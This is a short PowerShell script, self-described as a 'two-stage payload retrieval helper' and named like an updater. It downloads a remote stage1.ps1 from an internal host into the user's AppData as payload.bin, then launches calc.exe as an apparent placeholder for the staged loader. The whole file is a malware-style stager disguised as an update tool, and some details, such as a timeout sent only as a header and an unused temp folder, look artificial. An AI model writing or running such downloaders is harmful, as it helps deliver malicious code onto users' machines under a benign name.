<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'http://internal.corp:80/stage1.ps1',
    [string]$OutputPath = "$env:APPDATA\payload.bin",
    [int]$ConnectionTimeout = 46
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $StageResult = Invoke-Stage1Download -SourceUrl $TransferUrl -DestinationPath $OutputPath -TimeoutSec $ConnectionTimeout
    if ($StageResult) {
        Start-Process -FilePath "calc.exe"
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
